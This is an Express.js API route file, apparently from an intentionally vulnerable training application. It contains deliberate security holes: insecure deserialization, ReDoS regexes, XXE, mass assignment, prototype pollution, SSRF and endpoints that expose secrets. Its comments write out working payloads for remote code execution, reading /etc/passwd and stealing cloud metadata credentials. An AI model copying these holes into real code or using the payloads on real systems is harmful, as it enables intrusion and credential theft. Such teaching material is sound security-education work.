/**
 * ⚠️  WARNING: INTENTIONALLY VULNERABLE - FOR EDUCATIONAL PURPOSES ONLY ⚠️
 *
 * VULNERABILITIES DEMONSTRATED IN THIS FILE:
 * ─────────────────────────────────────────────────────────────────────────────
 *  [DESER-1]  Insecure deserialization — node-serialize@0.0.4 executes functions
 *  [REDOS-1]  ReDoS — exponential backtracking regex for email validation
 *  [REDOS-2]  ReDoS — exponential backtracking regex for username validation
 *  [XXE-1]    XML Injection / XXE — xml2js without XXE protection
 *  [MASS-1]   Mass Assignment — Object.assign() merges all user body fields
 *  [PROTO-1]  Prototype Pollution — JSON.parse on user input + merge
 *  [SSRF-1]   Server-Side Request Forgery — fetches any URL including internal
 *  [DISC-1]   Debug endpoint exposes all secrets, env vars, process info
 *  [DISC-2]   Schema introspection endpoint with no authentication
 *  [DISC-3]   Detailed error info returned in catch blocks
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * Example attack payloads:
 *
 *  Insecure Deserialization (RCE):
 *    POST /api/deserialize
 *    { "data": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('calc.exe')}()\"}" }
 *
 *  ReDoS (sends server into infinite loop):
 *    POST /api/validate-email
 *    { "email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" }
 *
 *  XXE (read local files):
 *    POST /api/parse-xml
 *    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>
 *
 *  SSRF (AWS metadata endpoint):
 *    GET /api/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 *
 *  SSRF (internal services):
 *    GET /api/fetch-url?url=http://localhost:6379  (Redis)
 *    GET /api/fetch-url?url=http://localhost:27017 (MongoDB)
 */

'use strict';

const express   = require('express');
const router    = express.Router();
const serialize = require('node-serialize');  // CVE-2017-5941 — RCE via deserialization
const xml2js    = require('xml2js');           // CVE-2023-0842 — prototype pollution
const secrets   = require('../config/secrets');

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/deserialize
// VULNERABILITY: Insecure Deserialization — node-serialize executes JS functions
// CVE: CVE-2017-5941
// ─────────────────────────────────────────────────────────────────────────────
router.post('/deserialize', (req, res) => {
  const { data } = req.body;

  // [DESER-1] VULNERABILITY: node-serialize@0.0.4 evaluates IIFE functions
  //   during deserialization. Any serialized object containing:
  //   "_$$ND_FUNC$$_function(){...}()"
  //   will have that function EXECUTED when unserialize() is called.
  //
  //   RCE Payload (spawn a reverse shell):
  //   {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
  try {
    const deserialized = serialize.unserialize(data);
    res.json({ success: true, deserialized });
  } catch (err) {
    // [DISC-3] VULNERABILITY: Full error details returned
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/validate-email
// VULNERABILITY: ReDoS — catastrophic backtracking on malicious input
// ─────────────────────────────────────────────────────────────────────────────
router.post('/validate-email', (req, res) => {
  const { email } = req.body;

  // [REDOS-1] VULNERABILITY: This regex has exponential backtracking
  //   Input that triggers DoS: 'a'.repeat(50) + '!'
  //   The nested quantifiers (([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*) cause
  //   catastrophic backtracking when the regex engine tries to match the failing '!'
  //
  //   Node.js is single-threaded: one ReDoS request blocks ALL other requests
  const emailRegex = /^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/;

  const start    = Date.now();
  const isValid  = emailRegex.test(email || '');
  const duration = Date.now() - start;

  res.json({ email, isValid, validationTimeMs: duration });
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/validate-username
// VULNERABILITY: Another ReDoS-vulnerable regular expression
// ─────────────────────────────────────────────────────────────────────────────
router.post('/validate-username', (req, res) => {
  const { username } = req.body;

  // [REDOS-2] VULNERABILITY: Exponential backtracking
  //   Payload: 'a'.repeat(40) + '!'   causes hang
  const usernameRegex = /^(([a-z])+.)+[A-Z]([a-z])+$/;

  const start    = Date.now();
  const isValid  = usernameRegex.test(username || '');
  const duration = Date.now() - start;

  res.json({ username, isValid, validationTimeMs: duration });
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/parse-xml
// VULNERABILITY: XML Injection / XXE via unsanitized xml2js
// ─────────────────────────────────────────────────────────────────────────────
router.post('/parse-xml', (req, res) => {
  const { xmlData } = req.body;

  // [XXE-1] VULNERABILITY: xml2js.parseString without XXE protection
  //   xml2js@0.4.19 does not enable XXE by default but the configuration
  //   below also does not explicitly disable external entities.
  //
  //   XXE payload (read /etc/passwd):
  //   <?xml version="1.0" encoding="UTF-8"?>
  //   <!DOCTYPE foo [<!ELEMENT foo ANY>
  //   <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  //   <foo><bar>&xxe;</bar></foo>
  //
  //   Billion Laughs DoS:
  //   <!DOCTYPE bomb [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">...]>
  xml2js.parseString(xmlData || '', {
    explicitArray:    false,
    ignoreAttrs:      false
    // Missing: explicitCharkey, strict mode, entity expansion limits
  }, (err, result) => {
    if (err) {
      // [DISC-3] VULNERABILITY: XML parse errors may reveal internal paths
      return res.status(400).json({ error: err.message });
    }
    res.json({ parsed: result });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/update-settings
// VULNERABILITY: Mass Assignment + Prototype Pollution via Object.assign
// ─────────────────────────────────────────────────────────────────────────────
router.post('/update-settings', (req, res) => {
  const defaultSettings = {
    theme:         'light',
    language:      'en',
    notifications: true,
    isAdmin:       false
  };

  // [MASS-1] VULNERABILITY: All user-supplied fields merged without whitelist
  //   Payload: { "isAdmin": true, "role": "admin" }  → privilege escalation
  //
  // [PROTO-1] VULNERABILITY: No Object.freeze or prototype check
  //   Payload: { "__proto__": { "polluted": true } }
  const settings = Object.assign({}, defaultSettings, req.body);

  res.json({ settings, objectProto: Object.prototype });
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/fetch-url
// VULNERABILITY: Server-Side Request Forgery (SSRF)
// ─────────────────────────────────────────────────────────────────────────────
router.get('/fetch-url', async (req, res) => {
  const { url } = req.query;

  if (!url) return res.status(400).json({ error: 'url parameter required' });

  // [SSRF-1] VULNERABILITY: Fetches any URL — no allowlist, no block of internal IPs
  //
  //   AWS metadata endpoint (cloud credential theft):
  //     url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
  //
  //   Google Cloud metadata:
  //     url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
  //
  //   Internal services:
  //     url=http://localhost:6379        (Redis — no auth)
  //     url=http://localhost:27017       (MongoDB)
  //     url=http://internal-api/admin    (internal services)
  //     url=file:///etc/passwd           (local file read via some fetch implementations)
  try {
    const response = await fetch(url, {
      // No timeout, no redirect limit, no IP blocking
      redirect: 'follow'
    });

    const contentType = response.headers.get('content-type') || 'text/plain';
    const data        = await response.text();

    res.setHeader('Content-Type', contentType);
    res.send(data);
  } catch (err) {
    // [DISC-3] VULNERABILITY: Connection error reveals internal network topology
    res.status(500).json({ error: err.message, url, code: err.code });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/debug
// VULNERABILITY: Debug endpoint left in production — exposes all secrets
// ─────────────────────────────────────────────────────────────────────────────
router.get('/debug', (req, res) => {
  // [DISC-1] VULNERABILITY: No authentication, no authorization
  //   Exposes every secret, every env var, process internals
  res.json({
    WARNING:  '⚠️ Debug endpoint — should NOT exist in production',
    secrets:  secrets,                // All hardcoded credentials
    env:      process.env,            // All environment variables
    process: {
      pid:          process.pid,
      versions:     process.versions,
      platform:     process.platform,
      arch:         process.arch,
      argv:         process.argv,     // Command line including any secret flags
      cwd:          process.cwd(),
      memoryUsage:  process.memoryUsage(),
      cpuUsage:     process.cpuUsage(),
      uptime:       process.uptime()
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /api/schema
// VULNERABILITY: Schema introspection — no authentication
// ─────────────────────────────────────────────────────────────────────────────
router.get('/schema', (req, res) => {
  // [DISC-2] VULNERABILITY: Reveals full DB schema and all endpoint names
  //   Aids attackers in understanding the application's data model
  res.json({
    database: {
      users:    ['id', 'username', 'password', 'email', 'role', 'credit_card', 'ssn', 'api_key', 'address', 'phone'],
      products: ['id', 'name', 'description', 'price', 'secret_field'],
      orders:   ['id', 'user_id', 'product_id', 'quantity', 'total', 'status'],
      sessions: ['id', 'user_id', 'token', 'data', 'created_at']
    },
    endpoints: {
      auth:     ['POST /auth/login', 'POST /auth/register', 'POST /auth/reset-password',
                 'GET /auth/verify', 'POST /auth/logout'],
      users:    ['GET /users/', 'GET /users/:id', 'GET /users/search',
                 'POST /users/update-profile', 'PUT /users/:id', 'DELETE /users/:id',
                 'POST /users/comment'],
      files:    ['GET /files/read', 'POST /files/write', 'POST /files/upload',
                 'GET /files/list', 'GET /files/logs', 'DELETE /files/delete'],
      commands: ['GET /cmd/exec', 'GET /cmd/ping', 'GET /cmd/nslookup',
                 'GET /cmd/traceroute', 'POST /cmd/template', 'GET /cmd/whois'],
      crypto:   ['POST /crypto/hash-password', 'POST /crypto/encrypt', 'POST /crypto/decrypt',
                 'GET /crypto/random-token', 'POST /crypto/generate-reset-token',
                 'POST /crypto/sign', 'POST /crypto/weak-iv'],
      api:      ['POST /api/deserialize', 'POST /api/validate-email',
                 'POST /api/validate-username', 'POST /api/parse-xml',
                 'POST /api/update-settings', 'GET /api/fetch-url',
                 'GET /api/debug', 'GET /api/schema']
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /api/json-parse
// VULNERABILITY: Prototype Pollution via JSON.parse and recursive merge
// ─────────────────────────────────────────────────────────────────────────────
router.post('/json-parse', (req, res) => {
  const { json } = req.body;

  // [PROTO-1] VULNERABILITY: Parsing user-supplied JSON and merging into a target
  //   Payload: { "__proto__": { "admin": true }, "data": "hello" }
  //   After this merge, every new object {} will have .admin === true
  try {
    const parsed = JSON.parse(json || '{}');

    // Recursive merge without hasOwnProperty guard — enables prototype pollution
    function mergeDeep(target, source) {
      for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object' && source[key] !== null) {
          if (!target[key]) target[key] = {};
          mergeDeep(target[key], source[key]);   // Walks into __proto__
        } else {
          target[key] = source[key];
        }
      }
      return target;
    }

    const result    = mergeDeep({}, parsed);
    const polluted  = ({}).admin;   // Check if prototype was polluted

    res.json({
      result,
      polluted,
      objectProtoAdmin: Object.prototype.admin  // Show pollution effect
    });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

module.exports = router;
